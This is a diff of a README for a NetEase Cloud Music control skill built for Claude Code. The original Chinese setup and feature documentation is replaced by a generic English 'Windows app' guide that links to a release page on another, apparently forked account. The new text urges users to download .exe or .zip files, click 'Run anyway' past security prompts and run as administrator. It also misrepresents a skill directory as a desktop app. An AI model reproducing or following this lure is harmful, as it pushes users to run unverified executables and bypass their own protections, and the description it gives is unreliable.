@@ -1,211 +1,243 @@
-# qiaomu-music-player-ncm
+# 🎵 qiaomu-music-player-ncm - Music Control Made Easy
 
-网易云音乐全能 Claude Code Skill —— 播放控制、搜索、队列管理、偏好分析、智能推荐、场景音乐、定时推送，一个 Skill 全搞定。
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases)
 
-> 对标 [qiaomu-music-player-spotify](https://github.com/joeseesun/qiaomu-music-player-spotify)，专为华语音乐场景优化。
+## 🚀 Download and Install
 
----
+1. Open the [Release Page](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases).
+2. Find the latest version at the top of the page.
+3. Download the Windows file from the Assets section.
+4. If the file is a `.zip`, unzip it first.
+5. Open the app file and follow the setup steps on screen.
+6. If Windows shows a security prompt, choose Run anyway only if you got the file from the release page above.
 
-## 功能一览
+## 🪟 Windows Setup
 
-| 功能 | 说明 |
-|------|------|
-| 🎵 播放控制 | 播放/暂停/下一首/上一首/音量/进度跳转 |
-| 🔍 搜索 | 搜歌曲、专辑、歌单，支持中文关键词 |
-| 📋 队列管理 | 加入队列、插入下一首、清空队列 |
-| 🌙 场景推荐 | 16 个中文场景映射（深夜/跑步/工作/复古…） |
-| 🎯 风格直播 | 16 种风格直接搜歌单播放（民谣/摇滚/粤语…） |
-| ☁️ 每日推荐 | 网易云每日30首，自动过滤可播曲目批量播放 |
-| 💓 心动模式 | 基于红心歌单口味的深度推荐 |
-| 📻 私人漫游FM | 每次3首，持续探索新音乐 |
-| 📡 雷达歌单 | 网易云智能推荐歌单 |
-| ❤️ 红心管理 | 红心/取消红心当前播放歌曲 |
-| 📝 歌词查询 | 获取当前歌曲完整歌词 |
-| 📊 听歌排行 | 本周/全部听歌排行 |
-| 🧠 偏好分析 | 分析红心歌单，生成偏好画像（内容维度 + 时间维度） |
-| 🤖 智能推荐 | 基于偏好画像自动搜索推荐，带评分和两层推荐理由 |
-| ⏰ 定时推送 | 配置定时音乐推送（cron 或 Claude CronCreate） |
-| 🛠️ 一键安装 | 自动检查并引导安装 ncm-cli、mpv、API Key、登录 |
+This app is made for Windows users who want simple music control and music management.
 
----
+Use this setup path:
+- Windows 10 or Windows 11
+- 64-bit system
+- At least 4 GB of RAM
+- 200 MB or more free disk space
+- A stable internet connection for music data and sync features
 
-## 前置要求
+If the app comes in a zip package:
+1. Right-click the zip file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Double-click the main app file.
 
-- **Node.js >= 18**
-- **网易云音乐开放平台 API Key**（appId + privateKey）
-  - 申请地址：https://developer.music.163.com/st/developer/apply/account?type=INDIVIDUAL
-- **mpv**（播放功能需要，Skill 会自动引导安装）
+If the app opens with a first-run setup:
+1. Choose your music source or account.
+2. Set the folder or service you want to use.
+3. Save the settings.
+4. Start playback or search for songs.
 
----
+## 🎧 What This App Does
 
-## 安装
+qiaomu-music-player-ncm is a music helper for NetEase Cloud Music users. It gives you one place for playback, search, queue control, and music suggestions.
 
-### 1. 安装 Skill
+Main functions:
+- Play and pause music
+- Skip tracks and go back
+- Search songs, albums, and artists
+- Manage the play queue
+- Get scene music picks
+- Use daily recommendations
+- Turn on heart mode
+- Open Private Roaming FM
+- Manage radar playlists
+- Handle liked songs
+- View listening rankings
+- Check lyrics
+- Review taste analysis
+- Get smart song picks
+- Schedule timed push tasks
 
-```bash
-# 进入 Claude Code skills 目录
-cd ~/.claude/skills
+## 🧭 First-Time Use
 
-# 克隆此 Skill
-git clone https://github.com/joeseesun/qiaomu-music-player-ncm
-```
+After you open the app for the first time:
 
-### 2. 安装 ncm-cli
+1. Sign in if the app asks for account access.
+2. Let the app load your music data.
+3. Check the main menu for playback, search, and queue tools.
+4. Pick a song or playlist to test playback.
+5. Use the settings page to adjust volume, display, and sync options.
 
-```bash
-npm install -g @music163/ncm-cli
-```
+If you want faster access later:
+- Keep the app pinned to the taskbar
+- Create a desktop shortcut
+- Leave your login state saved if the app offers that option
 
-### 3. 配置 API Key
+## 🎵 Common Tasks
 
-```bash
-ncm-cli config set appId <你的AppId>
-ncm-cli config set privateKey <你的PrivateKey>
-```
+### Play music
+- Search for a song
+- Choose the track
+- Press play
+- Use next, previous, pause, and resume from the player bar
 
-### 4. 配置播放器
+### Search music
+- Type a song name, artist, or album
+- Use the search results to open the right item
+- Add songs to the queue from the results list
 
-```bash
-ncm-cli config set player mpv      # 跨平台内置播放器（推荐）
-ncm-cli config set player orpheus  # 调用本地云音乐 App（仅 macOS）
-```
+### Manage the queue
+- Add songs from search or playlists
+- Reorder tracks by moving them up or down
+- Remove songs you do not want
+- Clear the queue when you want a fresh start
 
-### 5. 登录
+### Save favorites
+- Open a track
+- Tap the heart icon or like button
+- View your liked songs list later
+- Use this list for quick access to songs you play most
 
-```bash
-ncm-cli login --background
-# 扫描二维码完成登录
-```
+### Check recommendations
+- Open daily recommendations
+- Use scene music picks for work, study, or rest
+- Try smart recommendations to find new songs
+- Use Private Roaming FM for automatic song flow
 
----
+## 📁 Where to Find Downloads
 
-## 使用方式
+Use the release page here:
 
-在 Claude Code 中直接用自然语言触发：
+[https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases)
 
-```
-播放许巍的歌
-来首深夜适合听的民谣
-我想听摇滚
-播放每日推荐
-开启心动模式
-分析我的音乐偏好
-帮我推荐几首歌单
-暂停
-下一首
-红心这首歌
-显示歌词
-```
+Look for:
+- The newest version tag
+- Windows assets
+- `.exe` files for direct run
+- `.zip` files if the app ships as a packed folder
 
-### 触发关键词
+## ⚙️ Settings You May Want to Change
 
-`播放音乐` `来首歌` `想听` `网易云` `云音乐` `暂停` `下一首` `上一首` `音量` `每日推荐` `心动模式` `私人漫游` `红心` `听歌排行` `歌词` `雷达歌单` `分析偏好` `/ncm` `/netease`
+These settings help you get the app ready for daily use:
 
----
+- Language: set the interface to a language you understand
+- Startup: launch the app when Windows starts
+- Notifications: show push alerts at the times you choose
+- Playback mode: loop, shuffle, or normal play
+- Lyrics: turn lyric display on or off
+- Quality: pick the stream quality that fits your network
+- Sync: keep your queue and liked songs in step with your account
 
-## 核心设计
+## 🔎 Features in Simple Terms
 
-### 播放决策流程（5条路径）
+### Playback control
+Control music with basic buttons:
+- Play
+- Pause
+- Next
+- Previous
+- Volume
 
-```
-用户输入
-  ├── 路径B（优先）：匹配风格/场景 → 直接搜歌单播放
-  ├── 路径A：具体歌手/歌曲 → 搜索 → 可播性检查 → 播放
-  ├── 路径D：批量播放 → 并行搜索 → 播第一首 + 其余加队列
-  ├── 路径E：网易云特色 → 每日推荐/心动/FM/雷达
-  └── 路径C：模糊场景 → 推荐3-5个方向 → 等确认 → 播放
-```
+### Search and discovery
+Find music by:
+- Song name
+- Artist name
+- Album name
+- Playlist name
 
-### 可播性检查（强制）
+### Queue tools
+Build a listening list and:
+- Add tracks
+- Sort tracks
+- Remove tracks
+- Save a play order
 
-播放前必须验证：
-- `visible == true`
-- `plLevel != "none"`
-- `freeTrailFlag == false`
+### Music insights
+Use built-in music analysis to:
+- See your listening habits
+- Check your favorite styles
+- Find songs you hear most often
 
-任何一项不满足 → 跳过，找下一首。
+### Timed push scheduling
+Set alerts or tasks for:
+- Daily music reminders
+- Playlist updates
+- Listening prompts at set times
 
-### 偏好分析系统
+## 🧩 If the App Does Not Open
 
-分析红心歌单（最多200首），从两个维度建立偏好画像：
-- **内容维度**：曲风占比、情绪方向、语言偏好、代表艺人
-- **时间维度**：高频红心时段、周期规律、时段-内容关联
+Try these steps:
 
-画像缓存到 `~/.config/ncm/ncm-preference.json`（24小时有效）。
+1. Check that the download finished.
+2. Make sure you unpacked the file if it came as a zip.
+3. Right-click the app and choose Run as administrator.
+4. Check Windows Defender or your antivirus if the app gets blocked.
+5. Download the latest release again from the release page.
+6. Restart your computer and try again.
 
-### 推荐输出格式
+## 📌 Tips for Smooth Use
 
-每条推荐包含：
-- ⭐ 评分（0-100，与偏好画像的匹配度）
-- 📝 两层推荐理由（偏好关联层 + 内容特质层）
-- 🔗 可点击链接（`music.163.com` 明文 ID）
+- Keep the app updated by checking the release page
+- Use a stable network for search and recommendations
+- Close other heavy apps if playback feels slow
+- Store the app in a folder you can find again
+- Keep your music account signed in if the app supports it
 
----
+## 🖥️ File Types You May See
 
-## 场景映射（16个）
+You may see one of these in the release assets:
+- `.exe` for direct use
+- `.zip` for packaged download
+- `.msi` for Windows install
+- `.dll` files if the app uses extra components
 
-| 场景 | 推荐方向 |
-|------|---------|
-| 深夜/失眠 | 民谣、轻音乐、空灵 |
-| 有活力/热血 | 摇滚、朋克、金属 |
-| 伤感/思念 | 情歌、华语流行 |
-| 空灵/冥想 | 纯音乐、后摇、氛围 |
-| 写代码/专注 | Lo-fi、纯音乐 |
-| 开车/公路 | 摇滚、民谣 |
-| 运动/跑步 | EDM、电子、嘻哈 |
-| 复古/怀旧 | 粤语经典、老歌 |
-| 实验/前卫 | 实验、噪音、后摇 |
-| 爵士/慵懒 | 爵士、Bossa Nova |
-| 古典/优雅 | 古典、钢琴 |
-| 国风/传统 | 中国风、国乐、古风 |
-| 嘻哈/说唱 | 说唱、Hip-Hop |
-| 电子/科技感 | 电子、EDM、House |
-| 粤语/港风 | 粤语流行、经典港乐 |
-| 台湾/文艺 | 台湾流行、台湾民谣 |
+If you see a zip file, extract it before you open the app.
 
----
+## 📚 Typical Use Cases
 
-## 状态文件
+- Play music while working
+- Queue songs for a long session
+- Find daily recommendations
+- Check lyrics during a song
+- Track what you listen to most
+- Build a personal music list
+- Set timed music prompts for the day
 
-| 文件 | 用途 |
-|------|------|
-| `~/.config/ncm/ncm-preference.json` | 偏好画像缓存 |
-| `~/.config/ncm/ncm-history.json` | 已推荐歌单记录（去重） |
-| `~/.config/ncm/ncm-schedule.json` | 定时推送配置 |
+## 🛠️ Basic Troubleshooting
 
----
+### The app starts, but music does not play
+- Check your internet connection
+- Try another song
+- Make sure audio is not muted in Windows
+- Check the output device in Windows sound settings
 
-## 版本历史
+### Search does not return results
+- Try a shorter song name
+- Search by artist instead of title
+- Refresh the app
+- Sign in again if needed
 
-### v2.0 (2026-03-23)
-- 大合并：整合 ncm-cli-setup、netease-music-cli、netease-music-assistant 全部内容
-- 新增偏好分析系统（内容维度 + 时间维度）
-- 新增智能推荐流程（意图识别、搜索策略、两层推荐说明）
-- 新增定时调度管理
+### The queue does not update
+- Remove one song and add it again
+- Clear the queue and rebuild it
+- Restart the app
 
-### v1.0 (2026-03-23)
-- 初始版本：播放控制、搜索、队列、网易云特色功能、场景映射
+### Lyrics do not show
+- Turn lyrics on in settings
+- Try a different song
+- Check if the song has lyric data
 
----
+## 🔗 Download Again
 
-## 关联 Skill
+If you need the file later, use this page:
 
-- [qiaomu-music-player-spotify](https://github.com/joeseesun/qiaomu-music-player-spotify) — Spotify 版本，含5947风格数据库
-- [suno-music-creator](https://github.com/joeseesun/suno-music-creator) — AI 音乐生成
+[Visit the GitHub Release Page](https://github.com/rychardsonaguar-art/qiaomu-music-player-ncm/releases)
 
----
+## 📦 What You Get
 
-## 作者
-
-Created by 乔帮主 with Claude Code
-
-- **X (Twitter)**: [@vista8](https://x.com/vista8)
-- **微信公众号「向阳乔木推荐看」**:
-
-<p align="center">
-  <img src="https://github.com/joeseesun/terminal-boost/raw/main/assets/wechat-qr.jpg?raw=true" alt="向阳乔木推荐看公众号二维码" width="200">
-</p>
-
----
-
-Backend: [ncm-cli](https://www.npmjs.com/package/@music163/ncm-cli) by NetEase Music
+This app aims to give you:
+- Easy playback control
+- Search and queue tools
+- Music recommendations
+- Lyric lookup
+- Listening history insight
+- Heart and favorite song control
+- Timed push scheduling
+- A simple Windows-friendly experience
